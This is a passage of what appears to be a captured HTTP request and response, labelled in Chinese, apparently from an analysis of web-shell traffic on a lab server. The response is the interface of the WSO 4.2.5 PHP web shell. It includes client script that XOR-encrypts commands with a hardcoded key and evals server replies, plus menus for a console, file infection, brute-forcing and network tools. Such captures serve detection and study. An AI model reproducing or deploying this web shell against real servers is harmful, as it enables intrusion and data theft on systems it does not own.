	$...!..].$.)!..a...............PK..........!.)^.= ...........word/fontTable.xml..Mn.0....r...X.....9....&.&=.MS6Q..$m.g....
	z........0.....
	.0......%...N.]#2.(.......}z^].P.<..*..5:r...Won.yc.w...n.X.v...<wl..u..r
	..XE=...\Q.y.^3.Z..ZH..y...%.;..4.`.............v;...[7..3v.Z..s0...OQ...R..)..q....&.....\'8|).2.....X....#.Z$pY7.T...R.....j.8.........[x.O.........u...q....<.T.	.b....N..Z.7.KNl..wk\...c\.V(*.F....A)....Ig.A..@c.'.!7....I.B.y...._.....-...?..S.OB=.u.....S./.{z......Q....{.|.!J../...l..I...Hu.{	Q..$h#.=..].....QT_.M.@J.N..S.*46....
	
	.Q....I....Ua6..@...M....%U.=....@$..y.............)-........=r.........PK..........!...X?~...........docProps/app.xml ...(....................................................................................................................................................................................................................................................................R.N.0..#..Q..i)....j.8....l.....-........q#..Y.xvb...&......|:)...tJ.z....'.y...J.gq..0.................I._1.e....j[.T.."..5sU.%...h.&6+...mB.P..A0...>..E.....Z.<..Pb..H..;;f.\j.
	,..	S.... ~@.,j.|../........X_...A.D....3`#.7..-E.p....EW...;....6>.....G.i.......%'.`}A.....
	...
	.6R.\....&"...+.zaw.|.+.{./.t.......h.7......\.......l(.T...w ...I0..4kkT.3..]..........;.=G{...........PK..-.........!.	$............................[Content_Types].xmlPK..-.........!.........N....................._rels/.relsPK..-.........!.|;.9".........................word/_rels/document.xml.relsPK..-.........!..Q..w...N.................B	..word/document.xmlPK..-.........!..lN...........................word/theme/theme1.xmlPK..-.........!....EQ....
	....................word/settings.xmlPK..-.........!..?......l.................O#..word/webSettings.xmlPK..-.........!....j.....A................$%..word/stylesWithEffects.xmlPK..-.........!...>.E...u..................-..docProps/core.xmlPK..-.........!..+<.....%>................^0..word/styles.xmlPK..-.........!.)^.= ......................8..word/fontTable.xmlPK..-.........!...X?~......................:..docProps/app.xmlPK..........	....=....
	------WebKitFormBoundaryIx9sOhX04md8pGDP--

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Fri, 04 Nov 2016 06:25:44 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 5735
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html

	<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>192.168.182.143 - WSO 4.2.5</title>
	<style>
		body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
		#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
		body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
		table.info	{color:#C3C3C3;}
		table#toolsTbl {background-color: #060A10;}
		span,h1,a	{color:#fff !important;}
		span		{font-weight:bolder;}
		h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
		div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
		a			{text-decoration:none;}
		a:hover		{text-decoration:underline;}
		.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
		.tooltip:hover::after {opacity:1;visibility:visible;}
		.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
		.bigarea	{min-width:100%;max-width:100%;height:400px;}
		input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
		label {position:relative}
		label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
		label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
		form		{margin:0px;}
		#toolsTbl	{text-align:center;}
		#fak 		{background:none;}
		#fak td 	{padding:5px 0 0 0;}
		iframe		{border:1px solid #060a10;}
		.toolsInp	{width:300px}
		.main th	{text-align:left;background-color:#060a10;}
		.main tr:hover{background-color:#354252;}
		.main td, th{vertical-align:middle;}
		input[type='submit']{background-color:#2E6E9C;}
		input[type='button']{background-color:#2E6E9C;}
		input[type='submit']:hover{background-color:#56AD15;}
		input[type='button']:hover{background-color:#56AD15;}
		.l1			{background-color:#202832;}
		pre			{font:9pt Courier New;}
	</style>
	<script>
	    var c_ = '/var/www/html/webshell-master/php/wso/';
	    var a_ = 'FilesMan'
	    var charset_ = 'UTF-8';
	    var p1_ = 'uploadFile';
	    var p2_ = '';
	    var p3_ = '';
	    var d = document;
		
		function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
		function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
		function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
		function set(a,c,p1,p2,p3,charset) {
			if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
			if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
			if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
			if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
			d.mf.a.value = encrypt(d.mf.a.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.c.value = encrypt(d.mf.c.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p1.value = encrypt(d.mf.p1.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p2.value = encrypt(d.mf.p2.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p3.value = encrypt(d.mf.p3.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		}
		function g(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			d.mf.submit();
		}
		function a(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			var params = 'ajax=true';
			for(i=0;i<d.mf.elements.length;i++)
				params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
			sr('/webshell-master/php/wso/wso-4.2.5.php', params);
		}
		function sr(url, params) {
			if (window.XMLHttpRequest)
				req = new XMLHttpRequest();
			else if (window.ActiveXObject)
				req = new ActiveXObject('Microsoft.XMLHTTP');
	        if (req) {
	            req.onreadystatechange = processReqChange;
	            req.open('POST', url, true);
	            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	            req.send(params);
	        }
		}
		function processReqChange() {
			if( (req.readyState == 4) )
				if(req.status == 200) {
					var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
					var arr=reg.exec(req.responseText);
					eval(arr[2].substr(0, arr[1]));
				} else alert('Request error!');
		}
	</script>
	<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	<input type=hidden name=charset>
	</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ubuntu 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 <a href="http://noreferer.de/?http://www.google.com/search?q=Linux+ubuntu+3.19.0-25-generic+%2326%7E14.04.1-Ubuntu+SMP+Fri+Jul+24+21%3A16%3A20+UTC+2015+x86_64" target="_blank">[ Google ]</a> <a href="http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.19.0" target=_blank>[ Exploit-DB ]</a></nobr><br>33 ( www-data ) <span>Group:</span> 33 ( www-data )<br>5.5.9-1ubuntu4.19 <span>Safe mode:</span> <font color=#FFDB5F><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2016-11-03 23:25:44<br>18.58 GB <span>Free:</span> 13.12 GB (70.62%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/")'>webshell-master/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/")'>php/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/wso/")'>wso/</a> <font color=#FFDB5F><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>192.168.182.143<br><span>Client IP:</span><br>192.168.182.1</nobr></td></tr></table><table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th>[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script><script>
		function sa() {
			for(i=0;i<d.files.elements.length;i++)
				if(d.files.elements[i].type == 'checkbox')
					d.files.elements[i].checked = d.files.elements[0].checked;
		}
	</script>
	<table width='100%' class='main' cellspacing='0' cellpadding='2'>
	<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso/..');" ><b>[ .. ]</b></a></td><td>dir</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=white><b>drwxr-xr-x</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="hello.txt" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'hello.txt', 'view')">hello.txt</a></td><td>5 B</td><td>2016-11-03 23:18:32</td><td>www-data/www-data</td><td><a href=# onclick="g('FilesTools',null,'hello.txt','chmod')"><font color=#FFDB5F><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'hello.txt', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'hello.txt', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'hello.txt', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'hello.txt', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'hello.txt', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="readme.md" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'readme.md', 'view')">readme.md</a></td><td>1.73 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'readme.md','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'readme.md', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'readme.md', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'readme.md', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'readme.md', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'readme.md', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.1.3.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.1.3.php', 'view')">wso-4.1.3.php</a></td><td>75.76 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.1.3.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.1.3.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.0.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.0.php', 'view')">wso-4.2.0.php</a></td><td>86.53 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.0.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.0.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.1.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.1.php', 'view')">wso-4.2.1.php</a></td><td>75.72 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.1.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.1.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.2.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.2.php', 'view')">wso-4.2.2.php</a></td><td>75.71 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.2.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.2.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.3.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.3.php', 'view')">wso-4.2.3.php</a></td><td>76.26 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.3.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.3.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso-4.2.4.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.4.php', 'view')">wso-4.2.4.php</a></td><td>76.41 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.4.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.4.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso-4.2.5.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.5.php', 'view')">wso-4.2.5.php</a></td><td>77.86 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso-4.2.5.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso-4.2.5.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso.php', 'view')">wso.php</a></td><td>61.58 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso2.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso2.php', 'view')">wso2.php</a></td><td>64.56 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso2.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso2.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso2.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso2.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso2.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso2.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="wso2_pack.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso2_pack.php', 'view')">wso2_pack.php</a></td><td>24.17 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso2_pack.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso2_pack.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso_404.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso_404.php', 'view')">wso_404.php</a></td><td>105.04 KB</td><td>2016-11-03 17:58:16</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'wso_404.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'wso_404.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'wso_404.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'wso_404.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'wso_404.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'wso_404.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="WSO_4_0_5.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'WSO_4_0_5.php', 'view')">WSO_4_0_5.php</a></td><td>67.72 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'WSO_4_0_5.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'WSO_4_0_5.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="WSO_base64.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'WSO_base64.php', 'view')">WSO_base64.php</a></td><td>82.16 KB</td><td>2016-10-07 01:08:54</td><td>root/root</td><td><a href=# onclick="g('FilesTools',null,'WSO_base64.php','chmod')"><font color=white><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'WSO_base64.php', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'view')">-.docx</a></td><td>16.17 KB</td><td>2016-11-03 23:25:44</td><td>www-data/www-data</td><td><a href=# onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx','chmod')"><font color=#FFDB5F><b>-rw-r--r--</b></font></td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'touch')">T</a> <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g('FilesTools',null,'%E5%B7%A5%E4%BD%9C%E6%B1%87%E6%8A%A5-%E5%A7%9A%E9%A3%9E.docx', 'download')">D</a></td></tr><tr id=fak><td colspan=7>
		<input type=hidden name=ne value=''>
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
		<input type=hidden name=charset value='UTF-8'>
		<label><select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><option value='zip'>+ zip</option><option value='unzip'>- zip</option><option value='tar'>+ tar.gz</option></select></label><input type='submit' value='submit'></td></tr></form></table></div>
	</div>
	<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
		<tr>
